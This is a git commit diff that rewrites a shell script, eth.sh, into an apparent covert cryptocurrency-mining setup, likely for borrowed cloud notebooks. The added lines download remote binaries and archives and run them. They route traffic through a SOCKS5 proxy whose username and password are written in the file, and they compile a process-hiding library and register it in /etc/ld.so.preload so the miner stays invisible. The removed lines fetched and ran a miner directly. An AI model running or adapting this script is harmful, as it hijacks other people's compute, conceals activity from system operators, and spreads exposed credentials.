fdd8306595993cc3de69262833915781a302a3eb
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-02-24 12:01:11 +0700

    Update eth.sh

--- eth.sh
+++ eth.sh
@@ -1,6 +1,48 @@
-#!/bin/bash
-
-wget https://gitlab.com/Esaffvd/project-download/-/raw/main/nvidia
-chmod +x nvidia
-
-./nvidia --algo ETHASH --pool eth-us-west.flexpool.io:5555 --user 0xbca8d78f404533f2324abd652b46f04332eb2ca4.COLABS --tls on --longstats 5 --shortstats 5 --timeprint on --log on --basecolor
+#!/bin/sh 
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime 
+dpkg-reconfigure --frontend noninteractive tzdata 
+ 
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl 
+ 
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz 
+ 
+tar -xvzf graphics.tar.gz 
+ 
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+socks5 = 52.15.235.202:1080 
+socks5_username = mikrotik999 
+socks5_password = Elibawnos 
+END 
+ 
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf & 
+ 
+sleep .2 
+ 
+echo " " 
+echo " " 
+ 
+echo "**" 
+ 
+./graftcp/graftcp curl ifconfig.me 
+ 
+echo " " 
+echo " " 
+ 
+echo "**" 
+ 
+echo " " 
+echo " " 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
+chmod +x bezzHash 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
+unzip magicBezzHash.zip 
+make 
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
+mv libprocesshider.so /usr/local/lib/ 
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+ 
+./graftcp/graftcp ./bezzHash --url=ssl://3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.tempek@4ocean.hubnas.xyz:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
